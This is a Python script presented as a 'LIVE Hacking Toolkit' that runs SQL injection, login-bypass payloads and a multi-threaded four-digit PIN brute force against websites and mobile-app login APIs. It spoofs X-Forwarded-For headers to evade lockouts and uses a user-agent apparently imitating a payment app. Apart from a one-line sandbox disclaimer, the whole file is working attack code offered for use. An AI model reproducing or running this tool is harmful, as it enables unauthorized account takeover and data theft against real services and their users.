#!/usr/bin/env python3
"""
💀 MAFIA.D.GHOST - LIVE Unified Attack Tool
"""

import sys
import os
import time
import json
import random
import threading
import requests
import jwt
from queue import Queue
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════╗
║   ███╗   ███╗ █████╗ ███████╗██╗ █████╗              ║
║   ████╗ ████║██╔══██╗██╔════╝██║██╔══██╗             ║
║   ██╔████╔██║███████║█████╗  ██║███████║             ║
║   ██║╚██╔╝██║██╔══██║██╔══╝  ██║██╔══██║             ║
║   ██║ ╚═╝ ██║██║  ██║██║     ██║██║  ██║             ║
║   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝             ║
║                                                      ║
║                . D . G H O S T                       ║
╚══════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{Fore.YELLOW}         LIVE Hacking Toolkit v4.0
{Fore.RED}         ⚠️  Target YOUR OWN Sandbox API only!
"""

TARGET_TYPE = None 

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_headers(spoof_ip=False, is_json=True):
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; OPay App)"}
    if is_json: headers["Content-Type"] = "application/json"
    if spoof_ip:
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    return headers

# ==================== LIVE TOOLS ====================

def tool_sqli():
    print(f"\n{Fore.CYAN}--- LIVE SQL INJECTION SCANNER ({TARGET_TYPE.upper()}) ---")
    
    if TARGET_TYPE == "website":
        url = input("Enter URL with parameter (e.g., http://site.com/api?id=1): ").strip()
        param = input("Enter parameter (e.g., id): ").strip()
        
        print(f"\n{Fore.YELLOW}[*] Firing payloads at {url}...")
        payloads = ["'", "\"", "' OR 1=1--", "1' AND SLEEP(5)--"]
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for payload in payloads:
            params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
            
            start = time.time()
            try:
                r = requests.get(test_url, headers=get_headers(is_json=False), timeout=10)
                elapsed = time.time() - start
                
                if r.status_code == 500:
                    print(f"{Fore.RED}[!] 500 Server Error! Possible SQLi with: {payload}")
                elif elapsed > 4.5 and "SLEEP" in payload.upper():
                    print(f"{Fore.RED}[!] Time-Based SQLi Confirmed! Payload: {payload}")
                elif "sql syntax" in r.text.lower() or "mysql" in r.text.lower():
                    print(f"{Fore.RED}[!] Error-Based SQLi Confirmed! Payload: {payload}")
            except Exception as e:
                print(f"{Fore.RED}[-] Connection failed: {e}")
                break
        print(f"{Fore.GREEN}[+] SQLi scan finished.")

    else: # Mobile App
        url = input("Enter Login/API URL: ").strip()
        print(f"\n{Fore.YELLOW}[*] Firing JSON payloads to {url}...")
        payloads = ["' OR 1=1--", "admin'--", "1' UNION SELECT NULL--"]
        
        for payload in payloads:
            try:
                r = requests.post(url, json={"number": payload, "pin": payload}, headers=get_headers(is_json=True), timeout=10)
                print(f"[-] Sent: {payload} | Status: {r.status_code}")
                if r.status_code == 500:
                    print(f"{Fore.RED}[!] Server crashed (500)! Possible SQLi vulnerability.")
            except:
                pass

def tool_auth_bypass():
    print(f"\n{Fore.CYAN}--- LIVE AUTH BYPASS ({TARGET_TYPE.upper()}) ---")
    url = input("Enter Login URL: ").strip()
    
    print(f"\n{Fore.YELLOW}[*] Sending bypass payloads...")
    
    if TARGET_TYPE == "website":
        payloads = [("admin' OR '1'='1", "anything"), ("admin'--", "x"), ("admin", "admin")]
        for user, pwd in payloads:
            try:
                r = requests.post(url, data={"username": user, "password": pwd}, timeout=5)
                if r.status_code == 200 and "invalid" not in r.text.lower():
                    print(f"{Fore.RED}[!] LOGIN BYPASS SUCCESS! User: {user} | Pass: {pwd}")
                    return
            except: pass
    else:
        payloads = ["' OR 1=1--", "0000", "1234"]
        for p in payloads:
            try:
                headers = get_headers(spoof_ip=True, is_json=True) # IP Spoof active!
                r = requests.post(url, json={"number": p, "pin": p}, headers=headers, timeout=5)
                if r.status_code == 200 and "token" in r.text.lower():
                    print(f"{Fore.RED}[!] JSON BYPASS SUCCESS! Payload: {p}")
                    return
            except: pass
            
    print(f"{Fore.GREEN}[-] Auth bypass failed. App might be secure.")

def tool_brute_force():
    print(f"\n{Fore.CYAN}--- LIVE BRUTE FORCE ({TARGET_TYPE.upper()}) ---")
    url = input("Enter Login URL: ").strip()
    target = input("Enter Target Phone/Username: ").strip()
    
    print(f"\n{Fore.YELLOW}[*] Starting 10-Thread Attack on {target}...")
    if TARGET_TYPE == "app":
        print(f"{Fore.MAGENTA}[!] IP Spoofing ACTIVE (Bypassing lockouts).")
        
    q = Queue()
    for i in range(10000): q.put(str(i).zfill(4))
    found = False
    
    def worker():
        nonlocal found
        while not q.empty() and not found:
            pin = q.get()
            headers = get_headers(spoof_ip=True, is_json=(TARGET_TYPE=="app"))
            try:
                if TARGET_TYPE == "website":
                    r = requests.post(url, data={"username": target, "password": pin}, headers=headers, timeout=5)
                else:
                    r = requests.post(url, json={"number": target, "pin": pin}, headers=headers, timeout=5)
                
                if r.status_code == 200 and "invalid" not in r.text.lower():
                    print(f"\n{Fore.RED}{Style.BRIGHT}[+] PIN FOUND: {pin}")
                    found = True
                    break
            except: pass
                
    threads = [threading.Thread(target=worker) for _ in range(10)]
    for t in threads: t.start()
    for t in threads: t.join()
    
    if not found: print(f"{Fore.GREEN}[-] Brute force finished. PIN not found.")

def tool_jwt():
    print(f"\n{Fore.CYAN}--- JWT DECODER ---")
    token = input("Enter JWT Token: ").strip()
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        print(f"\n{Fore.GREEN}[+] Header: {jwt.get_unverified_header(token)}")
        print(f"{Fore.GREEN}[+] Payload:\n{json.dumps(decoded, indent=4)}")
    except Exception as e:
        print(f"{Fore.RED}[-] Invalid JWT Token: {e}")

# ==================== MAIN MENU ====================
def main():
    global TARGET_TYPE
    
    while True:
        clear_screen()
        print(BANNER)
        
        if TARGET_TYPE:
            print(f"{Fore.GREEN}[*] Current Target: {TARGET_TYPE.upper()}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[*] Current Target: NOT SET{Style.RESET_ALL}")
            
        print(f"\n{Fore.WHITE}Choose your attack vector:{Style.RESET_ALL}")
        print("  1. Set Target (Website or App)")
        print("  2. SQL Injection (Live)")
        print("  3. Auth Bypass (Live)")
        print("  4. Brute Force (Live Multi-thread)")
        print("  5. JWT Decoder")
        print("  6. Exit")
        
        choice = input(f"\n{Fore.CYAN}MAFIA.D.GHOST > {Style.RESET_ALL}").strip()
        
        if choice == "1":
            print("\n1. Website\n2. Mobile App")
            env = input("Select (1/2): ").strip()
            if env == "1":
                TARGET_TYPE = "website"
                print(f"{Fore.GREEN}[+] Target set to WEBSITE")
            elif env == "2":
                TARGET_TYPE = "app"
                print(f"{Fore.GREEN}[+] Target set to MOBILE APP")
            time.sleep(1)
            
        elif choice == "2":
            if not TARGET_TYPE: print(f"{Fore.RED}[!] Set target first!")
            else: tool_sqli()
            input(f"\n{Fore.WHITE}Press Enter to continue...")
            
        elif choice == "3":
            if not TARGET_TYPE: print(f"{Fore.RED}[!] Set target first!")
            else: tool_auth_bypass()
            input(f"\n{Fore.WHITE}Press Enter to continue...")
            
        elif choice == "4":
            if not TARGET_TYPE: print(f"{Fore.RED}[!] Set target first!")
            else: tool_brute_force()
            input(f"\n{Fore.WHITE}Press Enter to continue...")
            
        elif choice == "5":
            tool_jwt()
            input(f"\n{Fore.WHITE}Press Enter to continue...")
            
        elif choice == "6":
            print(f"\n{Fore.RED}Exiting MAFIA.D.GHOST. Stay stealthy. 💀")
            sys.exit()
            
        else:
            print(f"{Fore.RED}[!] Invalid choice.")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Force quit detected. Ghost vanished.")
        sys.exit()